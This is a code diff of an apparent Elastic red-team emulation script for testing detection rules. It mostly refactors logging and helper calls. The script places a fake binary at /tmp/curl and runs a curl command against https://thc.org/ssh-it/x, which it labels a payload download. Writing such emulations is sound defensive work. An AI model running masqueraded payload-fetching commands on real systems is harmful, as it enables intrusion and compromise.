@@ -3,9 +3,12 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
+import logging
 import sys
 
-from . import _common, register_code_rta, OSType, RuleMetadata
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 @register_code_rta(
     id="3ad5efdc-c186-4dbd-b5ce-f8d1f102002c",
@@ -19,12 +22,12 @@ from . import _common, register_code_rta, OSType, RuleMetadata
 )
 def main() -> None:
     masquerade = "/tmp/curl"
-    source = _common.get_path("bin", "linux.ditto_and_spawn")
+    source = _common.get_resource_path("bin/linux.ditto_and_spawn")
     _common.copy_file(source, masquerade)
 
     # Execute command
-    _common.log("Launching fake curl commands to download payload")
-    _common.execute([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout=5, kill=True)
+    log.info("Launching fake curl commands to download payload")
+    _ = _common.execute_command([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout_secs=5, kill=True)
 
     # cleanup
     _common.remove_file(masquerade)
